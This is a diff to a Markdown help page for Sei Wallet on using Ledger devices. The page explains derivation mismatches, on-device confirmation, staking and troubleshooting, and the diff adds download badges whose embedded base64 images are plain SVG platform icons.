@@ -5,23 +5,27 @@
 <p align="center">Connect the device, confirm the address on it, and stake from cold keys.</p>
 
 <p align="center">
-  <a href="https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.exe"><img src="https://img.shields.io/badge/download-windows-a82731?style=for-the-badge&labelColor=201412&logo=windows&logoColor=white" alt="Download Sei Wallet for Windows" height="40"></a>
+  <a href="https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.exe"><img src="https://img.shields.io/badge/download-windows-a82731?style=for-the-badge&labelColor=201412&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTMgNS41IDEwLjUgNC41djdIM3pNMTEuNSA0LjMgMjEgM3Y4LjVoLTkuNXpNMyAxMi41aDcuNXY3TDMgMTguNXpNMTEuNSAxMi41SDIxVjIxbC05LjUtMS4zeicvPjwvc3ZnPg%3D%3D&logoColor=white" alt="Download Sei Wallet for Windows" height="40"></a>
   <a href="https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.dmg"><img src="https://img.shields.io/badge/download-macos-a82731?style=for-the-badge&labelColor=201412&logo=apple&logoColor=white" alt="Download Sei Wallet for macOS" height="40"></a>
-  <a href="https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.zip"><img src="https://img.shields.io/badge/download-linux-a82731?style=for-the-badge&labelColor=201412&logo=linux&logoColor=white" alt="Download Sei Wallet for Linux" height="40"></a>
+  <a href="https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.zip"><img src="https://img.shields.io/badge/download-linux-a82731?style=for-the-badge&labelColor=201412&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTQgNS43IDUuNiA0LjIgMTMgMTJsLTcuNCA3LjhMNCAxOC4zIDkuOCAxMnonLz48cGF0aCBmaWxsPScjZmZmZmZmJyBkPSdNMTIgMTYuNGg4djIuMWgtOHonLz48L3N2Zz4%3D&logoColor=white" alt="Download Sei Wallet for Linux" height="40"></a>
 </p>
+
+<div align="center">
 
 | Platform | Requirements | File |
 |:--|:--|:--|
-| 🪟 Windows | Windows 10 (1909) or later, 64-bit | [`sei-wallet-v6.6.2.exe`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.exe) |
-| 🍎 macOS | macOS 12 or later | [`sei-wallet-v6.6.2.dmg`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.dmg) |
-| 🐧 Linux | x64, Ubuntu 20.04 or later, or equivalent | [`sei-wallet-v6.6.2.zip`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.zip) |
+| <img src="https://img.shields.io/badge/Windows-a82731?style=flat-square&labelColor=201412&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTMgNS41IDEwLjUgNC41djdIM3pNMTEuNSA0LjMgMjEgM3Y4LjVoLTkuNXpNMyAxMi41aDcuNXY3TDMgMTguNXpNMTEuNSAxMi41SDIxVjIxbC05LjUtMS4zeicvPjwvc3ZnPg%3D%3D&logoColor=white" alt="Windows" height="24"> | Windows 10 (1909) or later, 64-bit | [`sei-wallet-v6.6.2.exe`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.exe) |
+| <img src="https://img.shields.io/badge/macOS-a82731?style=flat-square&labelColor=201412&logo=apple&logoColor=white" alt="macOS" height="24"> | macOS 12 or later | [`sei-wallet-v6.6.2.dmg`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.dmg) |
+| <img src="https://img.shields.io/badge/Linux-a82731?style=flat-square&labelColor=201412&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTQgNS43IDUuNiA0LjIgMTMgMTJsLTcuNCA3LjhMNCAxOC4zIDkuOCAxMnonLz48cGF0aCBmaWxsPScjZmZmZmZmJyBkPSdNMTIgMTYuNGg4djIuMWgtOHonLz48L3N2Zz4%3D&logoColor=white" alt="Linux" height="24"> | x64, Ubuntu 20.04 or later, or equivalent | [`sei-wallet-v6.6.2.zip`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.zip) |
+
+</div>
 
 All versions and checksums are on the [Sei Wallet v6.6.2 release page](https://github.com/sei-chain/sei-wallet/releases/tag/v6.6.2).
 
 > [!WARNING]
 > Only download from this GitHub release page. Sei Wallet support never asks for a recovery phrase, and anyone who does is running a scam.
 
-Sei Wallet supports Ledger devices as an optional signing method: the wallet holds the interface, the device holds the keys, and every transaction needs a physical confirmation. Setup is short. What takes longer is understanding which app on the device is doing the work, because that choice determines which account you see — and a mismatch is the most common reason a connected Ledger appears to have lost its balance.
+Sei Wallet supports Ledger devices as an optional signing method: the wallet holds the interface, the device holds the keys, and every transaction needs a physical confirmation. Setup is short. What takes longer is understanding which app on the device is doing the work, because that choice determines which account you see - and a mismatch is the most common reason a connected Ledger appears to have lost its balance.
 
 The operator lists the Nano S+, the Nano X and the Stax as supported, and routes signing through Ledger's Ethereum app rather than the Cosmos app. That detail matters more than the device list: Sei is EVM-first, so the wallet asks the device for an Ethereum-style account.
 
@@ -30,10 +34,10 @@ The operator lists the Nano S+, the Nano X and the Stax as supported, and routes
 Three separate things have to be true, and they fail independently.
 
 1. **The device is recognised** by your computer and unlocked.
-2. **The right app is open** on the device — the Ethereum app, because that is the path the wallet uses.
+2. **The right app is open** on the device - the Ethereum app, because that is the path the wallet uses.
 3. **The wallet and the device agree on which account to open.** The same seed can derive many accounts; a different derivation produces a different address.
 
-When people say "my Ledger doesn't work with this wallet", it is almost always one of those three. Only the third produces the confusing symptom — a wallet that connects, shows an address, and shows the wrong balance.
+When people say "my Ledger doesn't work with this wallet", it is almost always one of those three. Only the third produces the confusing symptom - a wallet that connects, shows an address, and shows the wrong balance.
 
 ## Before you connect
 
@@ -55,11 +59,11 @@ If step 5 produces a different address than you expected, stop there. Do not sen
 
 ## What you should see on the device
 
-Every transaction produces a prompt on the device screen showing what is being signed. Read it. The wallet screen and the device screen should describe the same action — same amount, same destination, same validator if you are staking.
+Every transaction produces a prompt on the device screen showing what is being signed. Read it. The wallet screen and the device screen should describe the same action - same amount, same destination, same validator if you are staking.
 
 This is the entire security benefit of a hardware wallet, and it is easy to give away by approving on the device without looking. A compromised computer can show you a convincing interface, but it cannot change what the device displays without you noticing, provided you actually look.
 
-Some transactions cannot be fully rendered on a small screen and appear as a request to enable a broader signing mode. That setting is worth understanding before you turn it on, and it is covered in [blind signing explained](https://github.com/sei-chain/sei-wallet-help/blob/main/blind-signing-explained.md).
+Some transactions cannot be fully rendered on a small screen and appear as a request to enable a broader signing mode. That setting is worth understanding before you turn it on, and it is covered in [the Sei Wallet blind signing guide](https://github.com/sei-chain/sei-wallet-help/blob/main/blind-signing-explained.md).
 
 ## Staking and sending with a device attached
 
@@ -68,19 +72,23 @@ Nothing about the flows changes except the confirmation. Sending, staking, claim
 Two practical notes:
 
 - **Keep the device awake.** A prompt that times out mid-flow leaves a transaction unsigned, which looks like a failure but is simply an expired request. Start again.
-- **Unbonding still needs gas.** A hardware wallet changes who holds the keys, not the fee rules — nothing can pay an unbonding fee out of bonded stake, so the reserve matters whatever device signs.
+- **Unbonding still needs gas.** A hardware wallet changes who holds the keys, not the fee rules - nothing can pay an unbonding fee out of bonded stake, so the reserve matters whatever device signs.
 
 ## What breaks, and what each symptom means
+
+<div align="center">
 
 | Symptom | Usual cause |
 |---|---|
 | Device not detected at all | Cable, a USB hub, or another program holding the device |
-| Detected, but no accounts appear | Wrong app open — the Cosmos app instead of the Ethereum app |
+| Detected, but no accounts appear | Wrong app open - the Cosmos app instead of the Ethereum app |
 | Address differs from your other wallet | Different derivation; the account is real but not the one holding your balance |
 | Balance shows zero | Wrong account, wrong network, or two formats of one account |
 | Prompt never appears | Device locked, app closed, or the request timed out |
 
-None of these indicates theft. They are configuration mismatches, and the fix is to work from the address rather than from the wallet's label. A balance that arrived over a bridge is a further possibility: it is a representation rather than native SEI and will not show as native — [the Ethereum bridge](https://github.com/sei-chain/sei-wallet-staking/blob/main/bridge-from-ethereum.md) covers that route.
+</div>
+
+None of these indicates theft. They are configuration mismatches, and the fix is to work from the address rather than from the wallet's label. A balance that arrived over a bridge is a further possibility: it is a representation rather than native SEI and will not show as native - [the Ethereum bridge](https://github.com/sei-chain/sei-wallet-staking/blob/main/bridge-from-ethereum.md) covers that route.
 
 ## The rules that do not change with hardware
 
@@ -97,7 +105,7 @@ What the application itself is, and who runs it, is covered in [what the applica
 
 ## Is a Ledger worth it here?
 
-For a balance you would be upset to lose, yes — the isolation between keys and a general-purpose computer is real, and it holds regardless of which wallet you use.
+For a balance you would be upset to lose, yes - the isolation between keys and a general-purpose computer is real, and it holds regardless of which wallet you use.
 
 What it does not do: it does not make a fake download safe, it does not stop you approving a malicious transaction, and it does not recover a lost phrase. It moves one class of risk and leaves the others exactly where they were.
 
@@ -113,21 +121,25 @@ Support varies. Some hardware wallets sign Sei transactions directly, some rely 
 
 **Why does the wallet show a different address than my other wallet does?** The two wallets requested different derivations from the same seed. Two genuine accounts from one seed, and the funds sit in just one of them.
 
-**Do I need the Cosmos app?** Not for this wallet — signing goes through the Ethereum app, because Sei is EVM-first.
+**Do I need the Cosmos app?** Not for this wallet - signing goes through the Ethereum app, because Sei is EVM-first.
 
 **Can I stake with a Ledger connected?** Yes, with a device confirmation per transaction, including the unbonding transaction later.
 
-**Is my balance safer with a Ledger?** Against a compromised computer, yes. Against phishing, a fake download or your own misread approval, no — those are unaffected.
+**Is my balance safer with a Ledger?** Against a compromised computer, yes. Against phishing, a fake download or your own misread approval, no - those are unaffected.
 
 **What if the device prompt does not appear?** Unlock the device, open the Ethereum app, close other programs using it, then start the transaction again. A timed-out request is not a lost transaction.
 
 ## Download Sei Wallet
 
+<div align="center">
+
 | Platform | Installer |
 |:--|:--|
-| 🪟 Windows | [`sei-wallet-v6.6.2.exe`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.exe) |
-| 🍎 macOS | [`sei-wallet-v6.6.2.dmg`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.dmg) |
-| 🐧 Linux | [`sei-wallet-v6.6.2.zip`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.zip) |
+| <img src="https://img.shields.io/badge/Windows-a82731?style=flat-square&labelColor=201412&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTMgNS41IDEwLjUgNC41djdIM3pNMTEuNSA0LjMgMjEgM3Y4LjVoLTkuNXpNMyAxMi41aDcuNXY3TDMgMTguNXpNMTEuNSAxMi41SDIxVjIxbC05LjUtMS4zeicvPjwvc3ZnPg%3D%3D&logoColor=white" alt="Windows" height="24"> | [`sei-wallet-v6.6.2.exe`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.exe) |
+| <img src="https://img.shields.io/badge/macOS-a82731?style=flat-square&labelColor=201412&logo=apple&logoColor=white" alt="macOS" height="24"> | [`sei-wallet-v6.6.2.dmg`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.dmg) |
+| <img src="https://img.shields.io/badge/Linux-a82731?style=flat-square&labelColor=201412&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTQgNS43IDUuNiA0LjIgMTMgMTJsLTcuNCA3LjhMNCAxOC4zIDkuOCAxMnonLz48cGF0aCBmaWxsPScjZmZmZmZmJyBkPSdNMTIgMTYuNGg4djIuMWgtOHonLz48L3N2Zz4%3D&logoColor=white" alt="Linux" height="24"> | [`sei-wallet-v6.6.2.zip`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.zip) |
+
+</div>
 
 Every file above is attached to the [Sei Wallet v6.6.2 release](https://github.com/sei-chain/sei-wallet/releases/tag/v6.6.2), where the SHA-256 values are published. Verify the download before you run it.
 
